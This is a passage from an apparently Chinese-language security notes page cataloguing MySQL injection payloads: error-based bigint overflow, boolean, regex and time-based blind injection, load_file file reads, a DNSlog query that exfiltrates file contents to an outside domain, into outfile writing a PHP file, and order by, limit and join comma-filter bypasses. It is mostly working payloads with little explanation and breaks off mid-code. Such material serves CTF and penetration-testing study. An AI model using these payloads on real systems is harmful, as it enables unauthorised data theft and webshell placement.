src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155021574.png" alt="image-20210313155021574"></p><h3 id="1-2-4-mysql大整数溢出报错注入"><a href="#1-2-4-mysql大整数溢出报错注入" class="headerlink" title="1.2.4 mysql大整数溢出报错注入"></a>1.2.4 mysql大整数溢出报错注入</h3><p><a href="https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/">https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/</a></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155029034.png" alt="image-20210313155029034"></p><p>获取表名</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x)<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0</span></code></pre></div><p>获取列名</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x)<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0</span>;</code></pre></div><p>检索数据</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,id, username, password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x)<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0</span>;</code></pre></div><p>一次获取全部表与列</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span> <span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(concat(@:<span class="hljs-operator">=</span><span class="hljs-number">0</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-keyword">from</span>`information_schema`.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-keyword">and</span>@:<span class="hljs-operator">=</span>concat(@,<span class="hljs-number">0xa</span>,table_schema,<span class="hljs-number">0x3a3a</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)),@)))x)<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0</span>(<span class="hljs-keyword">select</span>(<span class="hljs-operator">!</span>x<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(concat (@:<span class="hljs-operator">=</span><span class="hljs-number">0</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-keyword">from</span>`information_schema`.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-keyword">and</span>@:<span class="hljs-operator">=</span>concat (@,<span class="hljs-number">0xa</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)),@))x)a)(<span class="hljs-keyword">select</span><span class="hljs-operator">!</span>x<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0.</span><span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(concat (@:<span class="hljs-operator">=</span><span class="hljs-number">0</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-keyword">from</span>`information_schema`.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-keyword">and</span>@:<span class="hljs-operator">=</span>concat (@,<span class="hljs-number">0xa</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)),@))x)a)</code></pre></div><h2 id="1-3-布尔注入"><a href="#1-3-布尔注入" class="headerlink" title="1.3 布尔注入"></a>1.3 布尔注入</h2><div class="hljs code-wrapper"><pre><code class="hljs mysql">left(database(),1)&gt;&#39;s&#39;截取数据库第一位ascii(substr((select table_name information_schema.tables where tables_schema &#x3D;database()limit 0,1),1,1))&#x3D;101 --+substr(a,b,c) 从b位置开始，截取字符串a的c长度ascii() 将某个字符转为ascii值ascii(substr(select database()),1,1)&#x3D;98ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23mid(a,b,c) 从位置b开始，截取a字符长的c位ord()同ascii()，将字符串转为ascii值</code></pre></div><h2 id="1-4-正则注入"><a href="#1-4-正则注入" class="headerlink" title="1.4 正则注入"></a>1.4 正则注入</h2><div class="hljs code-wrapper"><pre><code class="hljs mysql">select user() regexp &#39;^[a-z]&#39;;select user() regexp &#39;^ro&#39;I select * from users where id&#x3D;1 and 1&#x3D;(if((user() regexp &#39;^r&#39;),1,0));select * from users where id&#x3D;1 and 1&#x3D;(select 1 from information_schema.tables where table_schema&#x3D;&#39;security&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1);</code></pre></div><h2 id="1-5-延时注入"><a href="#1-5-延时注入" class="headerlink" title="1.5 延时注入"></a>1.5 延时注入</h2><div class="hljs code-wrapper"><pre><code class="hljs mysql">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23UNION SELECT IF(SUBSTRING(current,1,1)&#x3D;CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</code></pre></div><h3 id="1-5-1-sleep"><a href="#1-5-1-sleep" class="headerlink" title="1.5.1 sleep"></a>1.5.1 sleep</h3><h3 id="1-5-2-rpad-rlike"><a href="#1-5-2-rpad-rlike" class="headerlink" title="1.5.2 rpad+rlike"></a>1.5.2 rpad+rlike</h3><h3 id="1-5-3-benchmark"><a href="#1-5-3-benchmark" class="headerlink" title="1.5.3 benchmark"></a>1.5.3 benchmark</h3><div class="hljs code-wrapper"><pre><code class="hljs mysql">select * from table1 where 1&#x3D;1 and if(mid(user(),1,1)&#x3D;&#39;r&#39;,benchmark(10000000,sha1(1)),1) and cot(0);或select * from table1 where 1&#x3D;1 and if(mid(user(),1,1)&#x3D;&#39;r&#39;,concat(rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasdasdasdasdasdasdasdasdasdasdasdadasdasdasdasdasdasdasdasdasdasdasd&#39;,1) and cot(0);</code></pre></div><h3 id="1-5-4-笛卡尔积延时注入"><a href="#1-5-4-笛卡尔积延时注入" class="headerlink" title="1.5.4 笛卡尔积延时注入"></a>1.5.4 笛卡尔积延时注入</h3><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> information_schema.columns A;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220211329783.png" alt="image-20210220211329783"></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> information_schema.columns A,information_schema.columns B,information_schema.columns C;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220211336330.png" alt="image-20210220211336330"></p><h2 id="1-6-导入导出操作"><a href="#1-6-导入导出操作" class="headerlink" title="1.6 导入导出操作"></a>1.6 导入导出操作</h2><h3 id="1-6-1-load-file-读文件"><a href="#1-6-1-load-file-读文件" class="headerlink" title="1.6.1 load_file 读文件"></a>1.6.1 load_file 读文件</h3><div class="hljs code-wrapper"><pre><code class="hljs mysql">load_file()导出文件Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) Explain:“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:&#x2F;boot.ini”的 ASCII 代码-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) Explain:“c:&#x2F;boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”-1 union select 1,1,1,load_file(c:\\boot.ini) Explain:路径里的&#x2F;用 \\代替</code></pre></div><p>DNSLOG带外查询</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> load_file (concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,hex((<span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;D:/1.php&#x27;</span>))),<span class="hljs-string">&#x27;.t00ls.xxxxxxxxx.tu4.org\\a.txt&#x27;</span>))</code></pre></div><h3 id="1-6-2-into-outfile写文件"><a href="#1-6-2-into-outfile写文件" class="headerlink" title="1.6.2 into outfile写文件"></a>1.6.2 into outfile写文件</h3><ul><li><p>union写文件（0x3c3f70687020706870696e666f28293b3f3e = <?php phpinfo();?>）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;D:/1.php&#x27;</span></code></pre></div></li><li><p>FIELDS TERMINATED BY（可在limit等语句后）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;D:/1.php&#x27;</span> fields terminated <span class="hljs-keyword">by</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span></code></pre></div></li><li><p>LINES TERMINATED BY（可用于limit等sql注入）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> username <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;D:/1.php&#x27;</span> LINES TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span></code></pre></div></li><li><p>LINES STARTING BY（可用于limit等sql注入）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> username <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;D:/2.php&#x27;</span> LINES STARTING  <span class="hljs-keyword">BY</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span></code></pre></div></li></ul><h3 id="1-6-3-扫描文件是否存在"><a href="#1-6-3-扫描文件是否存在" class="headerlink" title="1.6.3 扫描文件是否存在"></a>1.6.3 扫描文件是否存在</h3><p><strong>load_file读取文件时，如果没有对应的权限获取或者文件不存在则函数返回NULL,所以结合isnull+load_file可以扫描判断文件名是否存在</strong></p><ul><li><p>如果文件存在，isnull(load_file(‘文件名’))返回0</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span>&gt; select * from user  where username = &#x27;&#x27; and updatexml(<span class="hljs-number">0</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,isnull(LOAD_FILE(&#x27;D:/<span class="hljs-number">1</span>.php&#x27;)),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">0</span>);<span class="hljs-attribute">ERROR</span> <span class="hljs-number">1105</span> (HY<span class="hljs-number">000</span>): XPATH syntax error: &#x27;~<span class="hljs-number">0</span>~&#x27;</code></pre></div></li><li><p>如果文件不存在isnull(load_file(‘文件名’))返回1</p><div class="hljs code-wrapper"><pre><code class="hljs subunit">mysql&gt; select * from user  where username = &#x27;&#x27; and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#x27;D:/xxxxx&#x27;)),0x7e),0);<span class="hljs-keyword">ERROR </span>1105 (HY000): XPATH syntax error: &#x27;~1~&#x27;</code></pre></div></li></ul><h3 id="1-6-4-INTO-DUMPFILE-写文件"><a href="#1-6-4-INTO-DUMPFILE-写文件" class="headerlink" title="1.6.4 INTO DUMPFILE 写文件"></a>1.6.4 INTO DUMPFILE 写文件</h3><div class="hljs code-wrapper"><pre><code class="hljs mysql">SELECT ... INTO DUMPFILE&#39;file_path&#39;</code></pre></div><h2 id="1-7-False注入（绕过登录和盲注）"><a href="#1-7-False注入（绕过登录和盲注）" class="headerlink" title="1.7 False注入（绕过登录和盲注）"></a>1.7 False注入（绕过登录和盲注）</h2><p>==遇到引号闭合的变量时==</p><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL&lt;=&gt;NULL 会返回1。不做类型转换---------------------------------------------两个参数都是字符串，按照字符串比较。不做类型转换---------------------------------------------两个参数都是整数，按照整数比较。不做类型转换---------------------------------------------如果不与数字进行比较，则将十六进制值视为二进制字符串。---------------------------------------------有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳---------------------------------------------有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较---------------------------------------------所有其他情况下，两个参数都会被转换为浮点数再进行比较---------------------------------------------最后那一句话很重要，说明如果我是字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败</code></pre></div><h3 id="1-7-1-算数运算"><a href="#1-7-1-算数运算" class="headerlink" title="1.7.1 算数运算"></a>1.7.1 算数运算</h3><div class="hljs code-wrapper"><pre><code class="hljs mysql">username&#x3D; &#39;admin&#39;+(payload)</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220205048963.png" alt="image-20210220205048963"></p><div class="hljs code-wrapper"><pre><code class="hljs mysql">x username &#x3D;&#39;1abc&#39;* (payload)username &#x3D;&#39;1abc&#39;&#x2F; (payload)username &#x3D;&#39;admin&#39;--(payload)</code></pre></div><h3 id="1-7-2-位运算"><a href="#1-7-2-位运算" class="headerlink" title="1.7.2 位运算"></a>1.7.2 位运算</h3><div class="hljs code-wrapper"><pre><code class="hljs mysql">username&#x3D;&#39;1abc&#39;&amp;(payload)username&#x3D;&#39;admin&#39;&lt;&gt;(payload)username&#x3D;&#39;admin&#39;&#x3D;(payload)</code></pre></div><h3 id="1-7-3-其他"><a href="#1-7-3-其他" class="headerlink" title="1.7.3 其他"></a>1.7.3 其他</h3><div class="hljs code-wrapper"><pre><code class="hljs mysql">&#39;+1 is not null#  &#39;in(-1,1)#  &#39;not in(1,0)#  &#39;like 1#  &#39;REGEXP 1#  &#39;BETWEEN 1 AND 1#  &#39;div 1#  &#39;xor 1#  &#39;&#x3D;round(0,1)&#x3D;&#39;1  &#39;&lt;&gt;ifnull(1,2)&#x3D;&#39;1</code></pre></div><h2 id="1-8-Mysql-无列名注入"><a href="#1-8-Mysql-无列名注入" class="headerlink" title="1.8 Mysql 无列名注入"></a>1.8 Mysql 无列名注入</h2><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220205436440.png" alt="image-20210220205436440"></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220205446396.png" alt="image-20210220205446396"></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `<span class="hljs-number">2</span>` <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)redforce;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220205454092.png" alt="image-20210220205454092"></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> concat(`<span class="hljs-number">2</span>`,<span class="hljs-number">0x3a</span>,`<span class="hljs-number">3</span>`) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)a limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">3</span>;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220205504662.png" alt="image-20210220205504662"></p><p>查询几个字段数目</p><h2 id="1-9-Mysql-join注入（bypass逗号过滤）"><a href="#1-9-Mysql-join注入（bypass逗号过滤）" class="headerlink" title="1.9 Mysql join注入（bypass逗号过滤）"></a>1.9 Mysql join注入（bypass逗号过滤）</h2><p>达到与逗号一样的效果</p><div class="hljs code-wrapper"><pre><code class="hljs sql">article.php?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union%0bselect * from (select 1)a join (select 2)b join (select 3)c join (select 4)d%23</span></code></pre></div><p>可配合无列名注入获取数据，例题：第五届上海市大学生网络安全大赛</p><h2 id="1-10-Mysql-order-by-后的注入"><a href="#1-10-Mysql-order-by-后的注入" class="headerlink" title="1.10 Mysql order by 后的注入"></a>1.10 Mysql order by 后的注入</h2><p><a href="https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html">https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html</a></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220205828767.png" alt="image-20210220205828767"></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220205835384.png" alt="image-20210220205835384"></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220205842371.png" alt="image-20210220205842371"></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;adminaa&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220205852564.png" alt="image-20210220205852564"></p><h3 id="1-10-1-if"><a href="#1-10-1-if" class="headerlink" title="1.10.1 if"></a>1.10.1 if</h3><ul><li><p>需要知道列名</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>,id,username)</code></pre></div></li><li><p>不需要知道列名</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> if(表达式,<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> information_schema.tables))</code></pre></div></li></ul><p>如果表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空，如果表达式为true是，则会返回正常的页面。</p><h3 id="1-10-2-基于时间的盲注"><a href="#1-10-2-基于时间的盲注" class="headerlink" title="1.10.2 基于时间的盲注"></a>1.10.2 基于时间的盲注</h3><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">1</span>))</code></pre></div><h3 id="1-10-3-基于rand-的盲注"><a href="#1-10-3-基于rand-的盲注" class="headerlink" title="1.10.3 基于rand()的盲注"></a>1.10.3 基于rand()的盲注</h3><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ha <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> rand(<span class="hljs-literal">true</span>)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs gherkin">mysql&gt; select <span class="hljs-symbol">*</span> from ha order by rand(true); +—-+——+ |<span class="hljs-string"> id </span>|<span class="hljs-string"> name </span>|<span class="hljs-string"> +—-+——+ </span>|<span class="hljs-string"> 9 </span>|<span class="hljs-string"> NULL </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> 6 </span>|<span class="hljs-string"> NULL </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> 5 </span>|<span class="hljs-string"> NULL </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string"> dss </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> 0 </span>|<span class="hljs-string"> dasd </span>|<span class="hljs-string"> +—-+——+ mysql&gt; select * from ha order by rand(false); +—-+——+ </span>|<span class="hljs-string"> id </span>|<span class="hljs-string"> name </span>|<span class="hljs-string"> +—-+——+ </span>|<span class="hljs-string"> 1 </span>|<span class="hljs-string"> dss </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> 6 </span>|<span class="hljs-string"> NULL </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> 0 </span>|<span class="hljs-string"> dasd </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> 5 </span>|<span class="hljs-string"> NULL </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> 9 </span>|<span class="hljs-string"> NULL </span>|<span class="hljs-string"> +—-+——+</span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> rand(ascii(mid((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">96</span>)</code></pre></div><h2 id="1-11-limit-注入"><a href="#1-11-limit-注入" class="headerlink" title="1.11 limit 注入"></a>1.11 limit 注入</h2><h3 id="1-11-1-不存在order-by-关键字–-gt-使用union"><a href="#1-11-1-不存在order-by-关键字–-gt-使用union" class="headerlink" title="1.11.1 不存在order by 关键字–&gt;使用union"></a>1.11.1 不存在order by 关键字–&gt;使用union</h3><div class="hljs code-wrapper"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220210144605.png" alt="image-20210220210144605"></p><div class="hljs code-wrapper"><pre><code class="hljs mysql">select id from users limit 0,1 union select username from users;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220210245179.png" alt="image-20210220210245179"></p><h3 id="1-11-2-存在order-by-（无法使用union-select-–-gt-PROCEDURE函数"><a href="#1-11-2-存在order-by-（无法使用union-select-–-gt-PROCEDURE函数" class="headerlink" title="1.11.2 存在order by （无法使用union select –&gt;PROCEDURE函数"></a>1.11.2 存在order by （无法使用union select –&gt;PROCEDURE函数</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220210310288.png" alt="image-20210220210310288"></p><h4 id="1-11-2-1-配合报错"><a href="#1-11-2-1-配合报错" class="headerlink" title="1.11.2.1 配合报错"></a>1.11.2.1 配合报错</h4><div class="hljs code-wrapper"><pre><code class="hljs mysql">select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220210934787.png" alt="image-20210220210934787"></p><h4 id="1-11-2-2-配合延时"><a href="#1-11-2-2-配合延时" class="headerlink" title="1.11.2.2 配合延时"></a>1.11.2.2 配合延时</h4><div class="hljs code-wrapper"><pre><code class="hljs mysql">select * from admin where id &gt;0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1&#x3D;1,benchmark(2000000,md5(404)),1)))),1);</code></pre></div><h2 id="1-12-insert、update注入配合conv"><a href="#1-12-insert、update注入配合conv" class="headerlink" title="1.12 insert、update注入配合conv"></a>1.12 insert、update注入配合conv</h2><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220211602784.png" alt="image-20210220211602784"></p><p>获取的数据超过8个字节</p><ul><li><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> conv(hex(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span> <span class="hljs-operator">+</span> (n<span class="hljs-number">-1</span>) <span class="hljs-operator">*</span> <span class="hljs-number">8</span>, <span class="hljs-number">8</span> <span class="hljs-operator">*</span> n)), <span class="hljs-number">16</span>, <span class="hljs-number">10</span>);</code></pre></div></li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220211640456.png" alt="image-20210220211640456"></p><ul><li><p>获取表名</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> conv(hex(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>schema() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span> <span 